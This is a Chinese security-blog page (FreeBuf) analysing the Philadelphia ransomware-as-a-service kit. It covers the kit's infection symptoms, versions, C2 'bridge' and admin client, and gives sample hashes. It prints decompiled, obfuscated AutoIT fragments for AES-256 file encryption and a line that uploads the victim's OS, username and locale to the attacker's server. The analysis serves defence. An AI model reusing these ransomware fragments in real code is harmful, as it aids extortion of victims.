-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  最具同情心的勒索软件套件Philadelphia - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="前言
最近，一种新型的勒索软件服务（RaaS）名为Philadelphia，开始向外以400美元的价格售卖，这个恶意软件作者的名为Rainmaker。据Rainmaker所说，该程序套件提供一种低成本的勒索软件服务，它允许任何一个有犯…" />
<meta name="keywords" content="Philadelphia" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='深信服科技招聘安全人才' href='http://www.freebuf.com/jobs/130465.html' />
<link rel='next' title='验证码安全那些事' href='http://www.freebuf.com/articles/rookie/131542.html' />
<link rel='canonical' href='http://www.freebuf.com/sectool/131502.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=131502' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
<link href="http://static.3001.net/css/new/style.css?ver=2017030809" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                <div class="nav">
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com">首页</a></li>
                        <li class="read-classify">
                            <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                        <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item"><a href="http://www.freebuf.com/news/special" target="_blank">头条</a><a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a><a href="http://www.freebuf.com/fevents" target="_blank">活动</a><a href="http://www.freebuf.com/video" target="_blank">视频</a><a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a><a href="http://www.freebuf.com/jobs" target="_blank">招聘</a><a href="http://www.freebuf.com/paper/" target="_blank">报告</a></div>
                                </li>
                            </ul>
                        </li>
                        <li ><a href="http://www.freebuf.com/wenku" target="_blank">文库</a><b class="icon-betr"></b></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com" target="_blank">漏洞盒子</a></li>
                    </ul>
                </div>
                <div class="header-right">
                                    <div class="loginSign login-after">
                        <p class="user-info" id="user-info">
                            <span class="user-name">Voraka</span>
                            (<span class="user-rank">1</span>级)
                            <span class="triangle-down mt25"></span>
                                                    </p>
                        <div class="login-after-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/">我的主页</a></li>
                                <li><a href="http://shop.freebuf.com/order">我的订单</a></li>
                                <li><a href="http://www.freebuf.com/user/pm">我的私信
                                                                            </a></li>
                                <li><a href="http://www.freebuf.com/user/myfavorites">我的收藏</a></li>
                                <li><a href="http://my.freebuf.com/profile">资料设置</a></li>
                                <li><hr/></li>
                                                                                                <li><a href="http://www.freebuf.com/wp-login.php?action=logout&amp;redirect_to=http%3A%2F%2Ffreebuf.com%2Fsectool%2F131502.html&amp;_wpnonce=f6a67a3ed6" title="退出">退出</a></li>
                            </ul>
                        </div>
                    </div>
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com">首页</a></li>
                        <li class="read-classify">
                            <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                        <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                        <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                        <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                        <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                        <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                        <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                        <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li ><a href="http://www.freebuf.com/wenku" target="_blank">文库</a></li>
                        <li><a href="http://fit.freebuf.com/" target="_blank">FIT大会</a></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com" target="_blank">漏洞盒子</a></li>
                        <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="http://www.freebuf.com/author/voraka">我的主页</a></li>
                                                        <li><a href="http://www.freebuf.com/wp-login.php?action=logout&amp;redirect_to=http%3A%2F%2Ffreebuf.com%2Fsectool%2F131502.html&amp;_wpnonce=f6a67a3ed6" title="退出">退出</a></li>
                                            </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<script type="application/javascript">
    $(function(){
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
            $(".read-classify").find(".dropdown-menu").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //分类阅读下拉菜单
        $(".read-classify").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(this).find(".dropdown-menu").toggle();
        });
        //分类阅读hover状态
        $(".read-classify").hover(function(){
            $(this).find("a > b").addClass("triangle-down-w");
        },function(){
            $(this).find("a > b").removeClass("triangle-down-w");
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
    });

</script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="container pad-top35">
  <div class="row clearfix">
        <div class="col-md-9" id="getWidth">
      <div class="article-wrap panel panel-default">
                    <div class="articlecontent">
        <div class="title">
          <h2> 最具同情心的勒索软件套件Philadelphia </h2>
                            <div class="property">
		  		  <span class="name"><a href="http://www.freebuf.com/author/voraka" title="由 Voraka 发布" rel="author">Voraka</a></span>
		  		  <span class="icon-f"></span>
		  <span class="time">2017-04-14</span>
            		  <span class="look">共<strong>8989</strong>人围观
              </span>          </span>
		  <span class="tags">		  
		  <a href="http://www.freebuf.com/./sectool">工具</a><a href="http://www.freebuf.com/./articles/database">数据安全</a></span>	
        <span class="tags_01"></span>
		  </div>
                    </div>
                        <div id="contenttxt">
           <p style="text-align: center;"><img width="650" height="471" alt="ksb_2016_eng_2-1024x742.jpg" data-original="http://image.3001.net/images/20170407/14915454461845.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="650" height="471" alt="ksb_2016_eng_2-1024x742.jpg" src="http://image.3001.net/images/20170407/14915454461845.jpg!small"></p></noscript>
<h2><strong>前言</strong></h2>
<p><b style="color: rgb(0, 176, 80);">最近，一种新型的勒索软件服务（RaaS）名为Philadelphia，开始向外以400美元的价格售卖，这个恶意软件作者的名为Rainmaker。据Rainmaker所说，该程序套件提供一种低成本的勒索软件服务，它允许任何一个有犯罪意图的人发动高级的勒索软件攻击，并且它操作简单，成本低。</b></p>
<p>同时，据Rainmaker介绍，Philadelphia“创新”勒索软件服务市场，它具有自动检测功能：当付款已经完成，然后自动解密；感染USB驱动器，并通过网络感染其他计算机。 特别值得注意的是，“同情按钮”将提供给赋有同情心的犯罪分子解密特定受害者的文件。 为了演示这种新的勒索软件服务，Rainmaker创建了一个显示其功能的<a href="http://www.docdroid.net/vJV82cC/philadelphia-prints.pdf.html"><u>PDF</u></a>和<a href="https://krebsonsecurity.com/2017/03/ransomware-for-dummies-anyone-can-do-it/"><u>视频</u></a>。</p>
<h2><b>感染症状</b><br /></h2>
<hr />
<p>当文件被加密后，文件名称将被更改为.lock后缀的文件名。例如文件test.jpg可能会变成7B205C09B88C57ED8AB7C913263CCFBE296C8EA9938A.locked. 加密完成后会显示下面的锁屏图像：</p>
<p style="text-align: center;"><img width="690" height="422" alt="hc3.png" data-original="http://image.3001.net/images/20170407/14915479244328.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="422" alt="hc3.png" src="http://image.3001.net/images/20170407/14915479244328.png!small"></p></noscript>
<p>如上图所示，受害者被要求支付0.3比特币，并且勒索软件声称加密文件的算法使用了AES-256和RSA-2048。最后勒索软件作者将重要的事情说了3遍——发送0.3比特币到下面的地址！！！</p>
<h2><b>样本分析</b><br /></h2>
<hr />
<p><span style="color: rgb(0, 112, 192);"><b>通过进一步观察，该恶意软件是由AutoIT脚本编写并打包生成。通过反编译该AutoIT恶意程序，我们发现了其中的两个不同的版本。因此我们将分别分析它们。</b></span></p>
<p><b><i>V1.0</i></b></p>
<p>将自身拷贝到%appdata%\scvhost.exe，并且列出了待加密文件的类型：</p>
<p style="text-align: center;"><img width="690" height="84" alt="Capture.PNG" data-original="http://image.3001.net/images/20170407/14915527393770.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="84" alt="Capture.PNG" src="http://image.3001.net/images/20170407/14915527393770.png!small"></p></noscript>
<p>添加开机自启动：</p>
<p style="text-align: center;"><img width="690" height="35" alt="Capture1.PNG" data-original="http://image.3001.net/images/20170407/14915531427589.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="35" alt="Capture1.PNG" src="http://image.3001.net/images/20170407/14915531427589.png!small"></p></noscript>
<p>待加密的目录：</p>
<p style="text-align: center;"><img width="690" height="203" alt="Capture2.PNG" data-original="http://image.3001.net/images/20170407/14915529777405.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="203" alt="Capture2.PNG" src="http://image.3001.net/images/20170407/14915529777405.png!small"></p></noscript>
<p>加密 加密硬盘，可移动硬盘，网络映射：</p>
<p style="text-align: center;"><img width="690" height="229" alt="Capture3.PNG" data-original="http://image.3001.net/images/20170407/14915530405054.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="229" alt="Capture3.PNG" src="http://image.3001.net/images/20170407/14915530405054.png!small"></p></noscript>
<p style="text-align: center;"><img width="690" height="176" alt="Capture0.PNG" data-original="http://image.3001.net/images/20170407/14915556984447.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="176" alt="Capture0.PNG" src="http://image.3001.net/images/20170407/14915556984447.png!small"></p></noscript>
<p>经过混淆的加密文件算法：</p>
<pre><code>&nbsp;$48E2CB6EE27D6950 &amp;= _48E2CBFBE08D6950 ( 0 , STRINGTRIMRIGHT ( $48E02B6BE07D6950 [ $48E02B6BE07D6950 [ 0 ] ] , STRINGLEN ( ".locked" ) ) , $48E21B4BE07D6950 )
&nbsp;IF _48E2CB6BE0E16950 ( $48E30B6BE07D6950 , $48E2CB6EE27D6950 , $48E21B4BE07D6950 , $48E2CB6BC77D6950 ) AND NOT @ERROR THEN
&nbsp;_48E2BB6BE0CD6950 ( $48E30B6BE07D6950 )<br /></code></pre>
<p>用于加密的 Windows 库函数的初始化：</p>
<pre><code>$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptCreateHash" , "handle" , _48E2CBDBE00D6950 ( ) , "uint" , $48E2CB63E07D6950 , "ptr" , 0 , "dword" , 0 , "handle*" , 0 )
$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptHashData" , "handle" , $48E2CB6B407D6950 , "struct*" , $48E2CB6BE02D6950 , "dword" , DLLSTRUCTGETSIZE ( $48E2CB6BE02D6950 ) , "dword" , $48E2CB6BE0ED6950 )
$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptDeriveKey" , "handle" , _48E2CBDBE00D6950 ( ) , "uint" , $48E2CB3BE07D6950 , "handle" , $48E2CB6B407D6950 , "dword" , $48E28B6BE07D6950 , "handle*" , 0 )
$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptEncrypt" , "handle" , $48E27B6BE07D6950 , "handle" , 0 , "bool" , $48E2CD6BE07D6950 , "dword" , 0 , "ptr" , 0 , "dword*" , BINARYLEN ( $48E2BB6BE07D6950 ) , "dword" , 0 )<br /></code></pre>
<p>经过对上面混淆过后的代码回溯跟踪和分析，函数 <i>_48E2CB6BE0E16950()</i> 用来加密文件， 变量<i>$48E2CB6BC77D6950</i>是加密文件函数的一个重要参数，继续向上找发现该变量的初始化代码：</p>
<pre><code>&nbsp;GLOBAL CONST $48E2CB6BC77D6950 = 26128&nbsp;&nbsp;&nbsp;&nbsp;//0x6610&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CALG_AES_256<br /></code></pre>
<p>正如恶意软件所描述的，采用了AES-256加密算法，但是我们没有看到RSA加密算法。</p>
<p>生成随机数作为密钥：</p>
<p style="text-align: center;"><img width="690" height="155" alt="Capture7.PNG" data-original="http://image.3001.net/images/20170407/14915560005061.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="155" alt="Capture7.PNG" src="http://image.3001.net/images/20170407/14915560005061.png!small"></p></noscript>
<p><b><i>V2.0</i></b></p>
<p><span style="color: rgb(0, 112, 192);"><b>新的版本在大的功能方面和核心算法方面并没有太大的变化，故不作重复列举，以下只列出与旧版本不同的部分。</b></span></p>
<p>通过反编译我们发现，新版本的勒索软件Philadelphia释放了一个INI文件作为恶意软件的配置文件。</p>
<p>互斥体名，UAC，C2， 提示信息：</p>
<p style="text-align: center;"><img width="681" height="219" alt="Capture6.PNG" data-original="http://image.3001.net/images/20170407/14915571324555.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="681" height="219" alt="Capture6.PNG" src="http://image.3001.net/images/20170407/14915571324555.png!small"></p></noscript>
<p>待加密的目录：</p>
<p style="text-align: center;"><img width="527" height="288" alt="Capture8.PNG" data-original="http://image.3001.net/images/20170407/14915573029728.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="527" height="288" alt="Capture8.PNG" src="http://image.3001.net/images/20170407/14915573029728.png!small"></p></noscript>
<p>待加密的文件类型，释放的文件名，文件路径：</p>
<p style="text-align: center;"><img width="690" height="82" alt="Capture9.PNG" data-original="http://image.3001.net/images/20170407/14915574465943.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="82" alt="Capture9.PNG" src="http://image.3001.net/images/20170407/14915574465943.png!small"></p></noscript>
<p>由此我们可以看出，新版本的恶意程序摆脱了&#8221;硬编码&#8221;，通过设置配置文件来根据需要更改加密的具体细节。除此之外，我们在新版本中还发现一个有趣的地方：</p>
<p style="text-align: center;"><img width="577" height="93" alt="Capture10.PNG" data-original="http://image.3001.net/images/20170407/149155766194.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="577" height="93" alt="Capture10.PNG" src="http://image.3001.net/images/20170407/149155766194.png!small"></p></noscript>
<p>处于好奇，我们Google此人&#8221;<i>Fabian&#8221;&nbsp; ，</i>我们发现此人很可能是 Fabian Wosar， 此人正是 Emsisoft 的反病毒研究员，继续搜索我们发现，此前Emsisoft 宣布可以解密勒索软件Philadelphia。 但是从代码分析来看，新的版本加密文件的算法依然是AES-256，由此我们得出此勒索软件加密后的文件依旧可以解密而不需要交赎金。由此再来看这段代码，让人啼笑皆非。</p>
<p>最后，恶意程序将上传受感染者计算机的相关信息到攻击者的服务器：</p>
<pre><code>$C1 = _HL ( STRING ( $BU &amp; "?p=Insert&amp;osinfo=" &amp; _HI ( @OSVERSION ) &amp; "&amp;user=" &amp; _HI ( @USERNAME ) &amp; "&amp;country=" &amp; _HI ( $BX ) &amp; "&amp;locale=" &amp; _HI ( $BY ) &amp; "&amp;ucd=" &amp; _HI ( $BZ ) ) )<br /></code></pre>
<p style="text-align: center;"><img width="690" height="241" alt="hc6.png" data-original="http://image.3001.net/images/20170407/14915586127412.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="241" alt="hc6.png" src="http://image.3001.net/images/20170407/14915586127412.png!small"></p></noscript>
<h2><b></b></h2>
<h2><b>勒索软件</b><b>管理</b><b>客户端</b></h2>
<hr />
<p>对于发动Philadelphia勒索软件的攻击者，他们需要在网站上安装一个名为&#8221;网桥&#8221;的PHP脚本。 这些&#8221;网桥&#8221;将与勒索软件感染者连接，并存储有关受害者的加密密钥等信息。然后，攻击者在其计算机上运行名为Philadelphia总部的管理客户端，该管理客户端将连接到每个配置的&#8221;网桥&#8221;，并将受害者数据下载到其管理控制台。 这个客户端允许攻击者看到谁被感染，哪些国家感染最多，甚至如果有同情心的攻击者想允许某人免费解密他们的文件，甚至提供怜悯的按钮。如图：</p>
<p style="text-align: center;"><img width="633" height="447" alt="philadelphia-headquarters-application.png" data-original="http://image.3001.net/images/20170407/14915592303819.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="633" height="447" alt="philadelphia-headquarters-application.png" src="http://image.3001.net/images/20170407/14915592303819.png!small"></p></noscript>
<p>Sha1:</p>
<pre><code>9f906472665f6447dd24da499d6e0f7ebe119c82
63e74c51b8e8a2f4e5b7f4c43fd7b3e816e1b367
</code></pre>
<h2><b>总结</b></h2>
<hr />
<p>手动分析这种基于AutoIT勒索程序样本的难度并不大，但是通过强的代码混淆技术，反调试，反模拟器等技术的运用，的确给杀毒软件的识别和查杀带来了难度。同时，勒索软件出售服务的出现，加大了网络攻击的可能性，并降低了非专业技术人员实施网络攻击的难度，这值得我们警惕。</p>
<p><span style="font-size: 12pt;"><b style="color: rgb(159, 163, 168);">&nbsp;*本文作者：Voraka，转载请注明来自FreeBuf.COM</b></span></p>
                    </div>
        <div class="article-oper article-oper-new">
			<style>
				@font-face {font-family: 'iconfont';
					src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
					src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
					url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
					url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
					url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
				}
			</style>
			<div class="share-new clearfix">
				<div class="share-author">
											<a href="http://www.freebuf.com/author/Voraka" title="由 Voraka 发布" rel="author">
							<img src="http://image.3001.net/images/20170330/1490866287978.png!video" width="0" height="0" alt="Voraka" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />							<!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
						</a>
						<div class="share-author-info">
														<a class="author-name" href="http://www.freebuf.com/author/Voraka">Voraka</a>
							<!--<span class="icon-f"></span>-->
							<span>
                                <i class="colour-red">
                                    1                                </i>
                                篇文章</span>
